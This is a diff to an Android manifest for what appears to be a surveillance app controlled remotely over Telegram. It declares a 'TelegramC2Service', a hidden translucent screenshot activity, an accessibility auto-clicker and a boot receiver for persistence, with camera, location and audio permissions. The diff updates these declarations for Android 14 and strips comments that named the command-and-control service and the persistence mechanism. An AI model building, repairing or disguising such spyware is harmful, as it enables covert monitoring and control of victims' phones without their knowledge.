@@ -8,14 +8,16 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
+    <!-- ADDED: Essential for starting foreground services from the background on Android 13+ -->
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+
+    <!-- Required for the foreground service type declaration -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
+
     <!-- Feature Permissions -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
-
-    <!-- Special Permissions for newer Android versions -->
-    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
 
 
     <application
@@ -26,9 +28,8 @@
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar"
-        tools:targetApi="31">
+        tools:targetApi="34">
 
-        <!-- Main Activity (The initial UI) -->
         <activity
             android:name=".MainActivity"
             android:exported="true">
@@ -38,7 +39,6 @@
             </intent-filter>
         </activity>
 
-        <!-- Transparent Activity for Screenshot Permission -->
         <activity
             android:name=".ScreenshotActivity"
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
@@ -46,14 +46,13 @@
             android:taskAffinity=""
             android:excludeFromRecents="true"/>
 
-        <!-- Core C2 Service -->
+        <!-- FIXED: Added all required foregroundServiceType declarations -->
         <service
             android:name=".TelegramC2Service"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="mediaProjection|camera|location" />
 
-        <!-- Accessibility Service for Auto-Clicking -->
         <service
             android:name=".AutoClickerAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
@@ -66,7 +65,6 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- Boot Receiver for Persistence -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -77,5 +75,4 @@
         </receiver>
 
     </application>
-
 </manifest>
